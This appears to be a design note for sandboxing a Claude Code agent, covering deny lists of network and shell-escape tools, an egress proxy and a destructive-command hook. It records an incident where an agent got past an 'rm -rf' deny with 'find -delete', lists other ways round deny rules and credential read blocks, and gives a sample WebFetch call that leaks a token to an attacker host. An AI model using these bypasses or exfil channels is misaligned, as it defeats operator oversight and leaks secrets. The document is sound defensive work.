# Permissions posture and exfil channels

The deny/allow model in `config/claude-settings.json`, the two-phase planning/autonomous workflow, and the channels (WebFetch, Read tool denies, deny-destructive hook) that need explicit operator awareness.

The hook ruleset itself lives in `docs/deny-destructive-hook-plan.md`. This page is the surrounding model.

## Two-phase workflow

- **Planning runs** (you driving, approving each step): uncomment the planning-mode section in `proxy/allowed_domains.txt` (github/pypi/npm/nodejs), restart Squid, do clones/installs/pushes yourself. `permissions.defaultMode: "acceptEdits"` means Edit/Write auto-apply, Bash is prompt-gated.
- **Autonomous runs** (agent driving): re-comment the planning-mode domains, restart Squid. The agent's allow list covers routine read-only / non-destructive Bash; deny list blocks network tools (`curl`, `wget`, `ssh`, `scp`, `rsync`, `git push/clone/fetch`, `gh`, `glab`), package installers (`pip`, `npm`, `uv`, `pipx`, `cargo`, `go install`), shell-escape patterns (`bash -c`, `python -c`, `node -e`, `uv run bash`, `perl`, `ruby`, `lua`, `env`, `xargs`, `eval`), and audit-L7 additions: `awk` (gawk's `system()`), `sed` (gnu sed's `e` command), `ssh-keygen`, `git submodule` (fetches via configured URL, bypasses the `git fetch` deny), and `git config` (could rewrite `credential.helper` to a host-reaching shim between scrub passes).

`WebSearch` stays on; **`WebFetch` is intentionally OFF the default allow list** — see below.

## Deny list is defense in depth, not the boundary

Claude Code's permission matcher keys on the command prefix; denies can be routed around by wrapper idioms hard to enumerate exhaustively (`find -exec`, `make`, `npm run`, `<interpreter> /tmp/script.<ext>`). When the deny list misses, the real boundary still holds: egress proxy (domain + port allowlist), seccomp (no user namespaces → no in-container bwrap/nsenter), non-root + `cap_drop: ALL`.

Audit L8 (2026-05-14) extended the deny surface to destructive primitives reachable through allowed prefixes (`find -delete`/`-exec`/`-execdir`/`-ok`, `git clean -fdx`, `shred`, `truncate`, `dd of=`, `mkfs`) and to writes targeting the hook/settings files themselves. The matcher cannot express these mid-command shapes; enforcement is a `PreToolUse` hook wired on `Bash` and `Edit|Write|MultiEdit`, script baked root-owned at `/usr/local/lib/claude-hooks/deny-destructive.sh`. The prefix matcher in `permissions.deny` remains the primary filter (catches `rm -rf` etc. at command-prefix shape); the hook is the content-aware secondary layer for what the prefix matcher structurally can't see. See `docs/deny-destructive-hook-plan.md` for ruleset and maintenance.

## The discipline

If the agent says it needs a new package or fresh clone, that's a planning-phase signal — exit autonomous mode, you do it, resume. Don't widen agent permissions for one-off installs.

For one-shot planning-mode installs, `scripts/with-egress.sh` automates the toggle/restart/exec/restore/restart loop (`trap` ensures restore even on Ctrl-C):

```bash
scripts/with-egress.sh <p> -- '<cmd>'
scripts/with-egress.sh <p> --with pypi,npm -- '<cmd>'
```

Section tags match `[<tag>]` in `proxy/allowed_domains.txt` (typical: `pypi`, `npm`, `git`). Default opens `pypi` only.

**Concurrency / drift guards** (audit L4) inside `with-egress.sh`:

- A `flock` on `/tmp/with-egress.locks/<profile>.lock` prevents two concurrent invocations on the same profile from racing on the shared allowlist file. Second invocation fails fast with a clear message.
- A sentinel file `/Volumes/DataDrive/.claude-colima/profiles/.egress-widened-<profile>` is written before widening and removed on clean exit. If `with-egress.sh` is SIGKILL'd (or the host crashes), the sentinel survives and `setup.sh --verify` flags it. Manual recovery: `rm` the sentinel, then `docker exec egress-proxy-<p> squid -k reconfigure` for the affected profile to re-read the (already-restored) allowlist.

## `find -delete` and the hook self-protection model

The matcher is prefix-on-tokens; it cannot see destructive flags or path targets mid-command. The class includes `find -delete`/`-exec` (narrowed to destructive command tokens like `rm`/`mv`/`dd`/`shred`/`tee`/`chmod`/`chown` — benign `find -exec grep|wc|file|ls` passes through), `git clean -fdx`, `shred`, `truncate`, `dd of=`, `mkfs`, plus writes to the hook/settings files themselves.

Enforcement is a `PreToolUse` hook (`/usr/local/lib/claude-hooks/deny-destructive.sh`) installed root-owned in the image — the agent has no tool path that bypasses the kernel's write protection on those files (the matched Edit-side rule is defence in depth on top). The hook is fail-open on script error (defence in depth, not boundary) and gated by `verify-sandbox.sh` plus `scripts/audit/probes/settings.py`.

Output uses the current Claude Code contract: `{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"deny-destructive: <rule>: …"}}` — don't revert verify probes to the older `"decision":"block"` shape. Extending the ruleset requires touching the hook script *and* both probes — every new destructive primitive needs all three, or you get silent drift.

The two warn rules (`null-truncate`, `workspace-overwrite`) log JSON-line entries to `/home/agent/.cache/deny-destructive.log` rather than blocking. Promote to block only after a clean review week — read the log entries (each carries `ts`, `rule`, full `tool_input`) and confirm zero false-positive legitimate uses.

**Behavioural note:** when a Bash deny fires (matcher-level *or* hook-level), the expected agent posture is "surface it, ask the user" — pivoting to an equivalent allowed primitive is drift, not initiative. The original L8 incident was a `Bash(rm -rf:*)` deny that the agent routed around with `find -delete`; the hook closes that specific structural gap, but the discipline is the durable fix.

## `Read(**/.credentials*)` denies are nudges, not gates

The `Read` deny list in `config/claude-settings.json` only governs the **Read tool**. Reading the same files via `Bash(cat:*)`, `Bash(jq:*)`, `Bash(python /tmp/x.py)` etc. is allowed by the corresponding Bash entries — those entries exist for legitimate workflow reasons (project work needs to read project files, even ones whose names happen to match the patterns). The Read denies still narrow the most natural read path; they don't seal it. Don't overclaim them as a containment boundary.

## WebFetch is server-side egress that bypasses the proxy

`WebFetch` runs **on Anthropic's infrastructure**, not inside the container — every URL passed to it is fetched from outside the sandbox network entirely, then the response is shipped back to the agent. The destination server logs the request URL, which means the path/query is a covert exfil channel: `WebFetch("https://attacker.tld/log?token=…")` works regardless of `proxy/allowed_domains.txt`.

The template (`config/claude-settings.json`) intentionally omits the bare `WebFetch` entry from the allow list. Per-project `.claude/settings.local.json` should add narrowly-scoped patterns like `WebFetch(domain:docs.numer.ai)` for the docs sites a project actually consults — see the existing pattern in `.claude/settings.local.json`. **Do not add bare `WebFetch` back to the template's allow list.** If `WebSearch` is sufficient (it returns summaries, not arbitrary URL fetches), prefer that.
